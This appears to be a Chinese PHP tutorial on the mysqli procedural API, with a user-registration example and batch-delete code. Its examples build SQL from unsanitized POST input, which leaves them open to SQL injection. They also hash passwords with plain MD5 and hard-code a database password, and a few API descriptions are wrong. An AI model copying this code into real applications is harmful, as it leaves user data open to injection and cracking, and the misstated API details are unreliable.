<p>&amp;emsp;</p>
<h4 id="第一步-连接数据库服务器"><a href="#第一步-连接数据库服务器" class="headerlink" title="第一步:  连接数据库服务器"></a><font color="#3CB371" face="Comic sans MS">第一步:  连接数据库服务器</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_connect.asp">PHP mysql_connect() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_connect()</td>
</tr>
<tr>
<td align="center">函数原型</td>
<td align="left">mysql_connect(server,user,pwd,newlink,clientflag)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">连接到mysql数据库服务器</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功，则返回一个 MySQL 连接标识，失败则返回 FALSE。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">主机</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">数据库服务器登陆名</td>
</tr>
<tr>
<td align="center">参数3</td>
<td align="left">密码</td>
</tr>
<tr>
<td align="center">参数4</td>
<td align="left">数据库的名称</td>
</tr>
<tr>
<td align="center">参数5</td>
<td align="left">数据库服务器端口不填默认3306</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>对于参数4，数据库名称在此步已填并择，不需要执行第三步。</strong></font></p>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第二步-判断错误"><a href="#第二步-判断错误" class="headerlink" title="第二步:  判断错误"></a><font color="#3CB371" face="Comic sans MS">第二步:  判断错误</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_errno.asp">PHP mysqli_errno() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_errno(connection)</td>
</tr>
<tr>
<td align="center">功能&#x2F;返回值</td>
<td align="left">返回连接错误号，无错误返回0</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect()返回的资源可选。规定 SQL 连接标识符。如果未规定，则使用上一个<br>打开的连接。</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>如果mysqli_errno()函数返回错误号，则用mysqli_error()显示文本错误信息。</strong></font>&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_error.asp">PHP mysql_error() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_error(connection)</td>
</tr>
<tr>
<td align="center">功能&#x2F;返回值</td>
<td align="left">返回连接错误字符串，如果没有出错则返回 ‘’（空字符串）</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="第三步-选择数据库"><a href="#第三步-选择数据库" class="headerlink" title="第三步:  选择数据库"></a><font color="#3CB371" face="Comic sans MS">第三步:  选择数据库</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_select_db.asp">PHP mysqli_select_db() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysql_selecti_db(connection,database)</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功，则该函数返回 true。如果失败，则返回 false。</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">选择本连接中的<strong>数据库</strong></td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">需要连接的数据库名</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>若在第一步已填数据库，不需要更换成其他数据库，则不需要执行第三步。</strong></font></p>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第四步-设置字符集"><a href="#第四步-设置字符集" class="headerlink" title="第四步:  设置字符集"></a><font color="#3CB371" face="Comic sans MS">第四步:  设置字符集</font></h4><p><font color="#00B2EE">[<a href="http://www.runoob.com/php/func-mysqli-set-charset.html">PHP mysqli_set_charset 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_set_charset(connection,charset)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">设置与mysql服力器连接，结果，校验字符集</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">无返回值</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">字符集类型</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="第五步-准备SQL语句"><a href="#第五步-准备SQL语句" class="headerlink" title="第五步:  准备SQL语句"></a><font color="#3CB371" face="Comic sans MS">第五步:  准备SQL语句</font></h4><p><font color="#FF7F00"><strong>其实就是一个SQL语句的字符串，用于对MySQL数据库的操作。这一步很重要！</strong></font> </p>
<p>&amp;emsp;<br>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username,password) values(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some code</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>我们通常要把变量赋值在SQL语句中使用。可是变量或者SQL语句出错了，非常不好排查。</li>
<li>我们根据实际工作经验增加了这一步。</li>
<li>如果在执行此步的时候报错了，我们可以把SQL语句打印出来，粘贴到phpMyAdmin或者相关工具中。</li>
<li>排错时，如果执行成功就说明不是SQL语句的问题。如果执行失败，请仔细检查SQL语句。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第六步-发送SQL语句"><a href="#第六步-发送SQL语句" class="headerlink" title="第六步:  发送SQL语句"></a><font color="#3CB371" face="Comic sans MS">第六步:  发送SQL语句</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_query.asp">PHP mysqli_query() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">功能</td>
<td align="left">发送SQL语句,执行一条 MySQL 查询。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">mysqli_query() 仅对 SELECT，SHOW，EXPLAIN 或 DESCRIBE 语句<strong>返回一个资源标识符</strong>，<br>如果查询执行不正确则返回 FALSE。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">传入发送的SQL语句。注意：查询字符串不应以分号结束。</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>SQL语句准备完成，需要通过mysqli_query将SQL语句发送给MySQL服务器。</li>
<li>MySQL服务器会执行发送过来的SQL语句进行执行。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h4 id="第七步-判断是否执行正常或者遍历数据"><a href="#第七步-判断是否执行正常或者遍历数据" class="headerlink" title="第七步:  判断是否执行正常或者遍历数据"></a><font color="#3CB371" face="Comic sans MS">第七步:  判断是否执行正常或者遍历数据</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_fetch_array.asp">PHP mysqli_fetch_array() 函数</a>]</font><br>读取第6步中，发送的是select类别的语句，<font color="#FF7F00"><strong>通常需要将结果以数组形式输出显示出来</strong></font>。就需要用到遍历显示数据的函数。</p>
<p><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_fetch_array(data,array_type)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">得到result结果集中的数据，返回数组进行遍历</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">可选。规定要使用的数据指针。该数据指针是 mysqli_query() 函数产生的结果。</td>
</tr>
<tr>
<td align="center">参数2</td>
<td align="left">可选。规定返回哪种结果。可能的值：<br>MYSQL_ASSOC - 关联数组<br>MYSQL_NUM - 数字数组<br>MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>下面举例几个常用的<strong>将mysqli_query()查询得到的字符串处理成数组的函数</strong>…….</p>
<p><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysqli_fetch_assoc(data)</td>
<td align="left">返回根据从结果集取得的行生成的<strong>关联数组</strong>，如果没有更多行，则返回 false</td>
</tr>
<tr>
<td align="center">mysqli_fetch_row(data)</td>
<td align="left">返回根据从结果集取得的行生成的<strong>索引数组</strong>，如果没有更多行，则返回 false</td>
</tr>
<tr>
<td align="center">mysqli_fetch_object(data)</td>
<td align="left">从结果集（记录集）中取得一行作为对象。<br>若成功的话，本函数从 mysql_query() 获得一行，并返回一个对象。如果失败<br>或没有更多的行，则返回 false。</td>
</tr>
<tr>
<td align="center">mysqli_num_rows(data)</td>
<td align="left">返回结果集中行的数目。此命令仅对 SELECT 语句有效。<br>要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目，<br>用 mysqli_affected_rows()。</td>
</tr>
<tr>
<td align="center">mysqli_fetch_field</td>
<td align="left">从结果集中取得列信息并作为对象返回。</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="第八步-关闭数据库"><a href="#第八步-关闭数据库" class="headerlink" title="第八步:  关闭数据库"></a><font color="#3CB371" face="Comic sans MS">第八步:  关闭数据库</font></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_close.asp">PHP mysql_close() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_close(link_identifier)</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">关闭数据库连接</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="left">如果成功则返回 true，失败则返回 false。</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="red" face="Comic sans MS"><strong>其他：显示服务器信息函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_get_server_info</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">返回服务器信息</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">函数</td>
<td align="left">mysqli_get_server_version</td>
</tr>
<tr>
<td align="center">功能</td>
<td align="left">返回服务器版本</td>
</tr>
<tr>
<td align="center">参数1</td>
<td align="left">传入mysqli_connect返回的资源</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font><br>mysqli只学过程化的方法即可。在面向对象阶段实际工作中完全抛弃了mysqli的对象用法，而是使用的是PDO对象连接数据库的方式。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二-通过步骤做一个用户注册实例"><a href="#二-通过步骤做一个用户注册实例" class="headerlink" title="二. 通过步骤做一个用户注册实例"></a><font color="#FF6347" face="Comic sans MS">二. 通过步骤做一个用户注册实例</font></h3><blockquote>
<p><font color="#FF7F00"><strong>我们做一个最简单的注册页面。注册页面中有三个参数：</strong></font></p>
</blockquote>
<ol>
<li>用户名</li>
<li>密码</li>
<li>重复密码</li>
</ol>
<ul>
<li>用户写好三个参数后，点击提交的时候向<code>connect.php</code>页面中传入POST记录。</li>
<li>我们可以把<code>POST记录</code>处理后写入到MySQL数据库中，即完成了用户注。</li>
</ul>
<blockquote>
<p><font color="#FF7F00"><strong>本例用到的两个文件：</strong></font></p>
</blockquote>
<ol>
<li><code>index.php</code>：表单页面；</li>
<li><code>connect.php</code>：处理表单的页面。</li>
</ol>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>一、 判断重复密码：</strong></font></p>
<blockquote>
<p>1.<strong>由于有重复密码，</strong><font color="#FF7F00"><strong>如果用户两次输入的密码不一致也就是有没有进行下一步的任何意义。</strong></font><br>2.<font color="#FF7F00"><strong>在网页中很多地方还是使用到了重复密码。</strong></font><strong>因为，害怕的是用户产生手误。将密码填写出错。</strong><br>3.<font color="#FF7F00"><strong>用户在输入密码的时候可能在左右两边多打两个空格。因此，我们会使用trim将密码和重复密码的两边去掉空格。</strong></font></p>
</blockquote>
<p>&amp;emsp;<br>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) != trim(<span class="variable">$_POST</span>[<span class="string">&#x27;repassword&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;两次密码不一致,请返回上一页&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>二、 准备好写入的数据：</strong></font><br>我们需要把用户的<strong>输入数据</strong>和<strong>隐藏的数据</strong>都写入到数据库。</p>
<p><font color="red"><strong>可见数据有：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_POST[‘username’]</td>
<td align="left">用户名</td>
</tr>
<tr>
<td align="center">$_POST[‘password’]</td>
<td align="left">密码</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>我们需要把用户名去掉两边的空格，这样避免输入不必要的这些信息。</li>
<li>在mysql这一章节我们讲过，用户的密码不要让包括公司内部人员可见。保证密码是不可逆向的。在初级阶段大家学习一下MD5即可。以后我们再教大家其他的加密方式。</li>
</ol>
</blockquote>
<p><font color="red"><strong>不可见数据有：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$time</td>
<td align="left">用户的注册时间</td>
</tr>
<tr>
<td align="center">$_SERVER[‘REMOTE_ADDR’]</td>
<td align="left">用户的注册IP</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>time返回的unix时间戳</li>
<li>REMOTE_ADDR返回的是IP地址，我们可以用ip2long将其转为整型存储。</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = md5(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="variable">$time</span> = time();</span><br><span class="line"><span class="variable">$ip</span> = ip2long(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、连接数据库、判断错误、选择库和字符集：</strong></font></p>
<blockquote>
<ol>
<li>我们使用mysqli_connect连接到数据库服务器。</li>
<li>如果有错误，使用mysqli_errno得到错误号</li>
<li>如何时存在错误mysqli_error打印出所有的错误，并且退出程序执行</li>
<li>选择数据库并且设置字符集为utf8.</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;liwenkaihaha&#x27;</span>);</span><br><span class="line"><span class="comment">//如果有错误，存在错误号</span></span><br><span class="line"><span class="keyword">if</span>(mysqli_errno(<span class="variable">$conn</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择数据库</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="comment">//选择字符集</span></span><br><span class="line">mysqli_set_charset(<span class="variable">$conn</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、组合SQL语句：</strong></font><br>我们需要把得到的信息写入到数据库里面去，用户名、密码、创建时间、IP我们都得到了。</p>
<p>将对应的变量插入到SQL语句中即可。组合出来的SQL语句如下：<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username,password,createtime,createip) values(&#x27;&quot;</span> . <span class="variable">$username</span> . <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">,&#x27;&quot;</span> . <span class="variable">$password</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$ip</span> . <span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>而我们的创建表的语句如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="keyword">IF</span> NOT EXISTS user (</span><br><span class="line">id <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">username varchar(<span class="number">30</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">password char(<span class="number">32</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">createtime <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,</span><br><span class="line">createip <span class="keyword">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>表的格式（字段对应说明）：<br><font color="#00B2EE"></font></p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">username</th>
<th align="center">password</th>
<th align="center">createtime</th>
<th align="center">createip</th>
</tr>
</thead>
<tbody><tr>
<td align="center">用户编号</td>
<td align="center">用户名</td>
<td align="center">密码</td>
<td align="center">创建时间</td>
<td align="center">创建IP</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、发送语句，判断状态：</strong></font></p>
<blockquote>
<p>mysqli_query我们在上面说过，需要传入两个参数：</p>
</blockquote>
<ol>
<li>连接的资源，在这里对应的变量是$conn。</li>
<li>发送的SQL语句。在上面已经准备好了$sql。</li>
</ol>
<blockquote>
<p>SQL语句可以通过mysqli_query发送给MySQL服务器。发送成功$result则为true。否则为false。<br>成功的话，我们就可以提示用户注册成功啦。<br>有些情况下，可能还需要使用到**mysqli_insert_id()**。功能是获取上面通过insert插入数据的id并返回这个id。<br>mysqli_insert_id应用场景：新加的一个行的数据。我们需要得到自动增长的ID值，将这个ID值插入到另外一个表里面去时。就需要用到这个函数。</p>
</blockquote>
<p>&amp;emsp;</p>
<p><code>mysqli_insert_id()</code>使用举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;注册成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;注册失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前用户插入的ID为&#x27;</span>.mysqli_insert_id(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>六、关闭数据库连接：</strong></font></p>
<p>将资源变量传到到mysqli_close这个函数里面即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>先建立test数据库、user数据表。数据表建立语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="keyword">IF</span> NOT EXISTS user (id <span class="keyword">int</span>(<span class="number">11</span>) PRIMARY KEY AUTO_INCREMENT,username varchar(<span class="number">30</span>) NOT <span class="literal">NULL</span>,password char(<span class="number">32</span>) NOT <span class="literal">NULL</span>,createtime <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span>,createip varchar(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>) ENGINE=InnoDB <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br><font color="red"><strong>1. <code>index.php</code>表单页面：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;connect.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    重复密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;repassword&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;<br><font color="red"><strong>2. <code>connect.php</code>页面完整代码：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) != trim(<span class="variable">$_POST</span>[<span class="string">&#x27;repassword&#x27;</span>])) &#123;</span><br><span class="line">   <span class="keyword">exit</span>(<span class="string">&#x27;两次密码不一致,请返回上一页&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = md5(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="variable">$time</span> = time();</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo $username.&quot;/&quot;.$password.&quot;/&quot;.$time.&quot;/&quot;.$ip;</span></span><br><span class="line"><span class="comment">//如果有错误，存在错误号</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_errno(<span class="variable">$conn</span>)) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">mysqli_set_charset(<span class="variable">$conn</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username,password,createtime,createip) values (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;失败&#x27;</span>;</span><br><span class="line">   var_dump(<span class="string">&quot;错误为：&quot;</span>.mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">   var_dump(<span class="string">&quot;返回值：&quot;</span>.<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前用户插入的ID为&#x27;</span> . mysqli_insert_id(<span class="variable">$conn</span>);</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三-通过步骤做一个列表显示实例"><a href="#三-通过步骤做一个列表显示实例" class="headerlink" title="三. 通过步骤做一个列表显示实例"></a><font color="#FF6347" face="Comic sans MS">三. 通过步骤做一个列表显示实例</font></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1262.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4977.html">视频</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四-通过步骤操作之把用户做个分页"><a href="#四-通过步骤操作之把用户做个分页" class="headerlink" title="四. 通过步骤操作之把用户做个分页"></a><font color="#FF6347" face="Comic sans MS">四. 通过步骤操作之把用户做个分页</font></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1273.html">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4978.html">视频</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-批量和指定删除用户"><a href="#五-批量和指定删除用户" class="headerlink" title="五.  批量和指定删除用户"></a><font color="#FF6347" face="Comic sans MS">五.  批量和指定删除用户</font></h3><p>上面已经学过了通过步骤做一个列表显示，在删除前，<font color="#FF7F00"><strong>有单行删除数据和删除多行数据</strong></font>。</p>
<p>&amp;emsp;</p>
<h4 id="5-1-判断是单选还是多选删除"><a href="#5-1-判断是单选还是多选删除" class="headerlink" title="5.1 判断是单选还是多选删除"></a><font color="#3CB371" face="Comic sans MS">5.1 判断是单选还是多选删除</font></h4><blockquote>
<ol>
<li><font color="#FF7F00"><strong>单行是通过get传参的方式</strong></font>向delete.php文件中写上对应的ID。</li>
<li>而<font color="#FF7F00"><strong>多个删除是通过POST的方式</strong></font>向delete.php页面中传递对应的ID。</li>
<li>如果这两个都不符合的话，那我们可以视为数据不合法。</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = join(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据不合法&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="5-2-组合SQL语句"><a href="#5-2-组合SQL语句" class="headerlink" title="5.2 组合SQL语句"></a><font color="#3CB371" face="Comic sans MS">5.2 组合SQL语句</font></h4><blockquote>
<ol>
<li>MySQL这一章讲解过<font color="#FF7F00"><strong>删除时可以使用到in的子语句</strong></font>。</li>
<li>同样在这里，我们就可以用in的子语句来达到效果。</li>
